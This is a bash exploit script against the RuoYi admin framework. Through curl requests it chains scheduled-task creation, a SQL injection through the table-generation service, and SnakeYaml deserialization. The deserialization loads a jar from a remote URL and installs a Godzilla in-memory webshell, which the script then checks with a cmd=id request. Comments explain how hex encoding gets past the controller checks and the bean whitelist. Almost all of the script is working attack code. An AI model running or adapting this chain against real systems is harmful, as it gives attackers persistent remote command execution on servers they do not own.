#!/usr/bin/env bash
# RuoYi scheduled-task chain -> SnakeYaml deserialization -> Godzilla memshell jar.
# Stage 1: create task whose invoke_target hex-writes job 1 (bypasses all 6 controller checks).
# Stage 2: run it, verify job 1 rewritten. Stage 3: run job 1 -> Yaml.load -> jar loads -> interceptor in.
# Usage: chain_inject.sh BASE_URL JAR_URL COOKIE_JAR
#   e.g. chain_inject.sh http://127.0.0.1:8080 http://127.0.0.1:12346/g.jar cookies.txt
set -euo pipefail
BASE="${1:?usage: chain_inject.sh BASE_URL JAR_URL COOKIE_JAR}"
JAR="${2:?jar url missing}"
COOKIE="${3:?cookie jar missing}"
JOB="gzms$(date +%s | tail -c 6)"

# comma-free/paren-free payload: survives JobInvokeUtil param splitting
P="org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"${JAR}\"]]]]')"
# hex via argv — inline quoting silently produces empty HEX and a truncated SQL
HEX=$(python3 -c "import sys; print('0x'+sys.argv[1].encode().hex())" "$P")
INVOKE="genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = ${HEX} WHERE job_id = 1')"
echo "[*] payload ${#P} chars -> hex ${#HEX} chars (invoke_target varchar(500) limit)"

# Stage 1 — hex hides snakeyaml/http from the 6 controller checks; 1 dot passes bean whitelist
echo "[*] stage1: create $JOB"
curl -s --noproxy '*' -b "$COOKIE" -X POST "$BASE/monitor/job/add" \
  --data-urlencode "jobName=$JOB" --data-urlencode "jobGroup=DEFAULT" \
  --data-urlencode "invokeTarget=$INVOKE" --data-urlencode "cronExpression=0 0 0 1 1 ?" \
  --data-urlencode "misfirePolicy=0" --data-urlencode "concurrent=1" --data-urlencode "status=1"
echo

ID=$(curl -s --noproxy '*' -b "$COOKIE" -X POST "$BASE/monitor/job/list?pageNum=1&pageSize=20" \
  | python3 -c "import json,sys; print([r['jobId'] for r in json.load(sys.stdin)['rows'] if r['jobName']=='$JOB'][0])")
echo "[*] stage1 job id=$ID"

# Stage 2 — SQL executes via GenTableMapper ${sql}; MySQL hex literal auto-decodes into varchar
echo "[*] stage2: rewrite job 1"
curl -s --noproxy '*' -b "$COOKIE" -X POST "$BASE/monitor/job/run" -d "jobId=$ID"; echo
sleep 1
curl -s --noproxy '*' -b "$COOKIE" -X POST "$BASE/monitor/job/list?pageNum=1&pageSize=20" \
  | python3 -c "import json,sys; r=[x for x in json.load(sys.stdin)['rows'] if x['jobId']==1][0]; print('[*] job1 invoke_target:', r['invokeTarget'][:70])"

# Stage 3 — JobInvokeUtil runs Class.forName('org.yaml.snakeyaml.Yaml').load(...), zero runtime checks
echo "[*] stage3: trigger job 1"
curl -s --noproxy '*' -b "$COOKIE" -X POST "$BASE/monitor/job/run" -d "jobId=1"; echo
sleep 2

echo "[*] memshell echo check:"
curl -s --noproxy '*' "$BASE/login?cmd=id" | head -1

echo "[*] done. cleanup later:"
echo "    POST $BASE/monitor/job/edit  jobId=1 invokeTarget=ryTask.ryNoParams (keep other fields)"
echo "    POST $BASE/monitor/job/remove ids=$ID"
